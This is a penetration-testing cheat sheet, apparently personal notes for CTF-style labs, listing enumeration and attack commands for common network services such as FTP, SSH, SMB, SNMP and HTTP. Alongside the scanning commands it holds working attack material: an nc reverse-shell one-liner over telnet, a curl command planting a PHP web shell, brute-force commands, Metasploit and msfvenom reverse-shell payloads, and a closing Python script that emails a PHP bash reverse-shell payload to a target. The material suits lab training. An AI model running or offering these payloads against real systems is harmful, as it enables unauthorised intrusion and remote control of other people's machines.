# Network service Basic enumeration (Active Recon)
## Be ethical please


### NMAP General Port scanning

* All ports, UDP and TCP

        sudo masscan 10.10.114.225 -p1-65535,U:1-65535 --rate=1000 -e tun0 |tee masscan.port
    
  How works
  
        -p1-65535,U:1-65535 tells masscan to scan all TCP/UDP ports
        --rate=1000 scan rate = 1000 packets per second
        -e tun0 tells masscan to listen on the VPN network interface for responses
         
     If you find masscan is missing ports, try lowering your scan rate to 200-300. This generally is caused by a low quality or low speed connection to the VPN.
     
   Using nmap after descovering ports..(feed the found ports to)
    
        nmap -sV -sC -F -T4  -Pn -p80,443,3306 10.10.10.x
        nmap -sS -p- -Pn ip -vv 
        nmap -p- --min-rate=10000 --max-rate=11000 -v -oN open_nmap -n --open 10.10.11.166
    

   #### Nmap advanced clevest scan

   ```bash
     ipcalc 192.168.0.48  
     nmap -p 80 192.168.0.0/24 -oG nullbyte.txt
   ```  
     #filtering only open ports

     ```bash
     cat nullbyte.txt | awk '/Up$/{print $2}' | cat >> targetIP.txt
     ````

#### Scaning live hosts in subnet and saving only up and runging hosts

```bash
sudo nmap -sP -vvv IP/24 -oN nmap-192sub.txt | grep -v "host down, received no-response" | grep -iE "Nmap scan report for" | awk '{print $5}' | grep -i "192" | tee nmap192Livehosts.txt
sudo nmap -sVC -p- -vvv -iL nmap192Livehosts.txt -T4 | grep -iE "Discovered open port"
```

#### Scanning all ip addresses 

     nikto -h targetIP.txt
     nmap -il targetIP.txt
   
### Metasploit Modules for SSH service

    auxiliary/scanner/ssh/fortinet_backdoor
    auxiliary/scanner/ssh/juniper_backdoor
    auxiliary/scanner/ssh/ssh_enumusers
    auxiliary/scanner/ssh/ssh_identify_pubkeys    
    auxiliary/scanner/ssh/ssh_login
    auxiliary/scanner/ssh/ssh_login_pubkey
    auxiliary/scanner/ssh/ssh_version
    
## port 21  (ftp)

### nmap commands
    nmap -p 21 --script ftp* <ip>  
    nmap --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-anon,ftp-libopie,,ftp-vuln-cve2010-4221,tftp-enum -p 21 -n -v -sV -Pn 192.168.1.10
    
    #Attempt Anon login:
    User: Anonymous
    Pass: Anonymous

    # For tftp
    smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 10.11.1.111

### Metasploit Modules for FTP service;
    auxiliary/scanner/ftp/anonymous
    auxiliary/scanner/ftp/ftp_login
    auxiliary/scanner/ftp/ftp_version
    auxiliary/scanner/ftp/konica_ftp_traversal
    
### recursive download files in FTP server 

    wget -m ftp://anonymous:1223@10.10.223.246
    wget -r ftp://anonymous:1223@10.10.223.246


## port 22 (ssh)
### Nmape & brute commands
```bash
    nmap -sV 192.168.31.205
    nmap -p 22 -n -v -sV  -sC -Pn --script ssh-auth-methods --script-args ssh.user=root 192.168.1.10
    nmap -p 22 -n -v -sV -Pn --script ssh-hostkey 192.168.1.10 
    nmap --script ssh-brute -p 22 192.168.31.205
    nmap -p 22 -n -v -sV -Pn --script ssh-brute --script-args userdb=user_list.txt,passdb=password_list.txt 192.168.1.10
    nmap -p 22 --script ssh* -oA ssh_scan <ip>
    ssh-vulnkey <ip> key.pub
    ssh-keyscan <ip>
    ssh user@IP
    ssh -i id_rsa user@IPHERE 
    hydra -L users.txt -P pass.txt 192.168.31.205 ssh 
    hydra -L users.txt -P pass.txt 192.168.31.205 ssh -s 2222 # -s specify port to be tested.
    ssh pentest@192.168.31.205
    ssh pentest@192.168.31.205 'ifconfig' # Running Commands in remote hosts
    nmap --script ssh-auth-methods --script-args="ssh.user=pentest" -p 22 192.168.31.205 # Test the auth method used in SSH
```

### Metasploit password based authentication Commands

```bash
    use exploit/multi/ssh/sshexec
    set rhosts 192.168.31.205
    set payload linux/x86/meterpreter/reverse_tcp
    set username pentest
    set password 123
    show targets
    set target 1
    exploit
```

### Key based authentication (Metasploit)
```bash
use auxiliary/scanner/ssh/ssh_login_pubkey
set rhosts 192.168.31.205
set key_path /root/Downloads/ssh/id_rsa
set key_pass 123
set username pentest
exploit
```

### Key based authentication

```bash
    - SSH key-based authentication offers a secure and user-friendly method for accessing remote servers without relying on passwords. This technique employs a pair of cryptographic keys: a private key stored on your local device and a public key saved on the remote server.
    - The public and private key pair can be generated using the `ssh-keygen`
    - Stored by default in,  `/home/user/.ssh/id_rsa`
    - public key `id_rsa.pub` is copied to  `authorized_keys`
    - Give appropriete permission to key `chmod 600 id_rsa`
```

#### Login and cracking key password

```bash
    ssh -i id_rsa pentest@192.168.31.205
    ssh2john id_rsa > sshhash
    john --wordlist=/usr/share/wordlists/rockyou.txt sshhash
```

- Ref [Hacking article - PORT 22](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)
- Ref [Medium @oumasydney2000](https://medium.com/@oumasydney2000/ssh-penetration-testing-cd6570335743)
Ref [hacktricks.xyz pentesting-web-wordpress](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)

## port 23 (TELNET)

  ### Nmap commands
    nmap -n -sV -Pn --script "*telnet* and safe" -p 23 <ip>
   ###  Getting telnet passwd
    snmpget -v 1 -c public 192.168.2.46 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
   ####  port 23 telnet commads
     use ? for help
   #####  system command 
     > exec id
        uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
     > exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.66 4444 >/tmp/f    --Getting reverse shell


 
## port 25 (SMTP)
### nmap command
    nmap --script=smtp-enum-users,smtp-commands,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764,smtp-vuln-cve2010-4344 -p 25 -n -v -sV -Pn 192.168.1.10
    nmap --open --script smtp-enum-users -sS -p 25 -sV $IP/24
    smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 10.11.1.111


### Metasploit Modules for SMTP service;
    auxiliary/scanner/smtp/smtp_enum
    auxiliary/scanner/smtp/smtp_ntlm_domain
    auxiliary/scanner/smtp/smtp_relay
    auxiliary/scanner/smtp/smtp_version 

## port 53 (DNS)

###  DNS ZONE Transfer 

```bash   
dig +nocmd  trick.htb axfr +noall +answer @trick.htb
dig axfr @10.10.11.166  trick.htb
     
- `+nocmd` – Removes the +cmd options output.<br>
- `+noall` – Removes extra headers, flags, time information, message size, etc.<br>
- `+answer` – Tells dig to return the answer section (the “juicy” part of the output).

# Other tools
dnsrecon -d <server> -t axfr
host -1 test.com @ns1.test.com
nslookup -> set type=any
         -> ls -d test.com
dnsrecon -d TARGET -d /usr/share/wordlists/dnsmap.txt -t std
./DNSExplorer.sh <domain.com>
```

## Port 389 (LDAP)

```bash
ldapsearch -h <ip> -p <port> -x -s base
               -x: simple Authentication
               -s: scope (base, one, sub)
ldapsearch -LLL -x -H ldap://<FQDN> -b '' -s base '(objectclass=*)'
ldapsearch -h 10.11.1.111 -p 389 -x -b "dc=mywebsite,dc=com"
nmap -sT -Pn -n --open IP -p389 --script ldap-rootdse
```

#####################################################################################
# Web services  
#####################################################################################

## port 80 (HTTP)

### Enumeratng port 80

```bash 
nikto -h http://192.168.1.10/
nikto -host http://SERVER_IP/ -C all -output Apache.html -Format HTML 
curl -v -X PUT -d '<?php shell_exec($_GET["cmd"]); ?>' http://192.168.1.10/shell.php
dirb http://192.168.56.1 -r -o dirb.txt
sqlmap -u http://192.168.1.10/ --crawl=5 --dbms=mysql
cewl http://192.168.1.10/ -m 6 -w special_wordlist.txt
cewl http://runner.htb/ | grep -v CeWL > custom-wordlist.tx # For creating custom wordlist
medusa -h 192.168.1.10 -u admin -P  wordlist.txt -M http -m DIR:/admin -T 10
wfuzz -u http://10.13.37.11:5000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
nmap -p 80 -n -v -sV -Pn --script http-backup-finder,http-config-backup,http-errors,http-headers,http-iis-webdav-vuln,http-internal-ip-disclosure,http-methods,http-php-version,http-qnap-nas-info,http-robots.txt,http-shellshock,http-slowloris-check,http-waf-detect,http-vuln* 192.168.1.10
gobuster dir -u http://<address>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -s '200,204,301,302,307,403,500' -e -x txt,php,html
nmap -p 80 --script=http-backup-finder --script-args http-backup-finder.url=/web-serveur/ch11/index.php challenge01.root-me.org
hydra -l <username> -P <wordlist> 10.10.46.122 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```
# Index of / found

    wget --no-check-certificate -r -np -R "index.html*" -e robots=off https://domain.com/path_index_of # Disable certificate validation

# Find urls links in website

```bash
sudo apt install gospider -y
gospider -s http://linkvortex.htb/ -u web -t 10
curl -Ls URL |  grep -oP 'href="\K[^"]+'
curl -f -L URL | grep -Eo '"(http|https)://[a-zA-Z0-9#~.*,/!?=+&_%:-]*"'
```

# .Git Directory Found in web

```bash
wget -r -np -R "index.html*" -e robots=off http://dev.linkvortex.htb/.git/ # If 403, Then use githacker or gittools => gitdumper

# Gittools
## Dumping files from .git web dir # Bypass 403
./Dumper/gitdumper.sh https://ideotwebsite/.git/ output_folder

## Extracts a dumped .git dir
./Extractot/extractor.sh source_folder_.git_inside /dest_output_folder
```

# Site running wordpress

`WPSscan`
[Update] wpscan --update
[Enum Plugins] wpscan --url <http://> --enumerate p --api-key=
[Enum Themes] wpscan --url <http://> --enumerate t --api-key=
[Enum Users] wpscan --url <http://> --enumerate u --api-key=
[BF on Enum Users] wpscan --url <http://> --wordlist <pass.txt> --threads 50
[BF on Admin] wpscan --url <http://> --wordlist <pass.txt> --username admin --threads 50
```
    
   ### subdomain enumeration

    gobuster vhost -u http://forge.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -r
    
   or
    
    wfuzz -c -f domains -w /usr/share/wordlists/dirb/common.txt -u "http://cybercrafted.thm" -H "Host: FUZZ.cybercrafted.thm" --sc 200,403
    
   or
   
    ffuf -H 'Host: FUZZ.forwardslash.htb' -u http://10.10.10.183 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 0
   
   OR 
   
    wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hl 107
OR

    gobuster vhost -t 100 -k -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://artcorp.htb
OR

    gobuster vhost -w custom-wordlist.txt -u http://runner.htb  --append-domain


OR

    bash autosubrecon.sh <target>

 ## Port 443

In addition to the HTTP Enumeration commands, you can use the following SSL Scan command for HTTPs Service Enumeration;
   
    sslscan https://192.168.1.10/
    nmap -sV --script ssl-enum-ciphers -p 443 <ip>
    nmap -sV --script=ssl-heartbleed 192.168.101.8

   ## Using curl command
   * source https://infinitelogins.com/2020/07/10/enumerating-http-port-80/
   
  Pulling out internal/external links from source code.
  
           curl <address> -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

To view just HTTP Links:

      curl -s <address> | grep -Eo '(href|src)=".*"' | sed -r 's/(href|src)=//g' | tr -d '"' | sort

Strip out the HTML code from source-code of webpage.

      curl <address> -s -L | html2text -width '99' | uniq

Check for contents of robots.txt.

      curl <address>/robots.txt -s | html2text
   
    
#####################################################################################

 ##  Port 135 (RPC)
Enumeration commands for Microsoft RPC service;

    nmap -n -v -sV -Pn -p 135 --script=msrpc-enum 192.168.1.10 
### Metasploit Exploit Module for Microsoft RPC service;
    exploit/windows/dcerpc/ms05_017_msmq
 
## Port 139/445  (SAMBA (NetBios/TCP))
Enumeration commands for Microsoft SMB service;

```bash
nmap -v -p 139, 445 -oA SMB_Scan 10.11.1.0/24
nmap -p 139, 445 --script smb* -oA smb_scan <ip>
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.205.140
nmap -n -v -sV -Pn -p 445 --script=smb-ls,smb-mbenum,smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smbv2-enabled,smbv2-enabled,smb-vuln* 192.168.1.10
nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 10.11.1.111

nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 10.11.1.111

 or
nmap -script smb-* -p 139,445 <ip>

enum4linux -a 192.168.1.10
nmblookup -A <ip>
nbtscan <ip>
nbtscan -r 192.168.1.1/24
rpcclient -U "" 10.11.1.111
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall

smbclient -L 192.168.1.10
smbclient \\\\192.168.1.10\\ipc$ -U administrator
smbclient //192.168.1.10/ipc$ -U administrator
smbclient //192.168.1.10/admin$ -U administrator
smbclient //<IPINHERE>/Users -U 'USER%<PASSWORD>'
crackmapexec smb -u users.txt -p passes.txt --local-auth 10.10.10.178 --continue-on-success
winexe -U username //10.11.1.111 "cmd.exe" --system

smbtree 10.11.1.111
```
    
 ### Accessing the SAMBA Services
 
 *Entering with smbclient in samba shares without passwd
 
 *`ITDEPT` name of share
                
    smbclient --no-pass //192.168.236.11/ITDEPT
  ### Trick in samba services 
  *There maybe a port that run in the browser as samba service, So upload payload in samba and run in browser to get shell
  * Example windows gennerate payload with msfvenom
        
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.152.52  LPORT=4444 — platform windows -a x64 -f aspx -o shell2.aspx
 
### Metasploit Modules for Microsoft SMB service;

    auxiliary/scanner/smb/psexec_loggedin_users
    auxiliary/scanner/smb/smb_enumshares
    auxiliary/scanner/smb/smb_enumusers
    auxiliary/scanner/smb/smb_enumusers_domain
    auxiliary/scanner/smb/smb_login
    auxiliary/scanner/smb/smb_lookupsid
    auxiliary/scanner/smb/smb_ms17_010
    auxiliary/scanner/smb/smb_version


## Port 161/162 - UDP (SNMP)

- Enumeration commands for SNMP service;

```bash
nmap -sU --open -p 161 192.168.1.0/24 -oG SNMP_hosts.txt
nmap -p 161 --script snmp-enum <ip>
nmap -n -vv -sV -sU -Pn -p 161,162 --script=snmp-processes,snmp-netstat 192.168.1.10
perl /usr/share/doc/libnet-snmp-perl/examples/snmpwalk.pl -v 1 -c public 10.13.37.11
snmp-check -c public -v 2c 10.13.37.11 -d 
onesixtyone -c communities.txt -i 192.168.1.10 # Find community string 
snmp-check -t 192.168.1.10 -c public # -c <cummunity string>
snmpwalk -c public -v 1 192.168.1.10 [MIB_TREE_VALUE]
snmpenum 10.10.11.136 public linux.txt 
hydra -P passwords.txt -v 192.168.1.10 snmp
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.11.1.111
snmp-check 10.11.1.111 -c public|private|community

#Communities.txt
public
private
community

#SNMP MIB Trees
1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 ote configuration of the HP Jetdirect device when there are no other configuration methods or it can be used to check the current configurationUser Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports
```    

## Port 111 (NFS)

`apt-get install nfs-common`

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.205.140
showmount -e <ip>
mkdir /tmp/nfs
mount -t nfs <ip>:<share> /tmp/nfs
```
- More commands
- 
```bash
rpcinfo -p 10.11.1.111
rpcclient -U "" 10.11.1.111
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall
 ```

## Port 3306 (MYSQL)
- Enumeration commands for `MySQL` service;

```bash
nmap -n -v -sV -Pn -p 3306 --script=mysql-info,mysql-audit,mysql-enum,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-users,mysql-query,mysql-variables,mysql-vuln-cve2012-2122 192.168.1.10
mysql --host=192.168.1.10 -u root -p
mysql -u admin -padmin -c "show databases;set database mysql;select* from users;"  

# Remote access
mysql -u admin -padmin -h <ip>
```
        
 ## Port 3389  (RDP)
 
Enumeration commands for Remote Desktop service;

    ncrack -vv --user administrator -P passwords.txt rdp://192.168.1.10,CL=1
    rdesktop 192.168.1.10

### Metasploit Modules for Remote Desktop service;

    auxiliary/scanner/rdp/ms12_020_check
    auxiliary/scanner/rdp/rdp_scanner 

## Sending email with python exploit in it
            
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        import smtplib
        import sys

        lhost = "127.0.0.1"
        lport = 443
        rhost = "192.168.1.1"
        rport = 25 # 489,587

        # create message object instance
        msg = MIMEMultipart()

        # setup the parameters of the message
        password = "" 
        msg['From'] = "attacker@local"
        msg['To'] = "victim@local"
        msg['Subject'] = "This is not a drill!"

        # payload 
        message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

        print("[*] Payload is generated : %s" % message)

        msg.attach(MIMEText(message, 'plain'))
        server = smtplib.SMTP(host=rhost,port=rport)

        if server.noop()[0] != 250:
            print("[-]Connection Error")
            exit()

        server.starttls()

        # Uncomment if log-in with authencation
        # server.login(msg['From'], password)

        server.sendmail(msg['From'], msg['To'], msg.as_string())
        server.quit()

        print("[***]successfully sent email to %s:" % (msg['To']))  
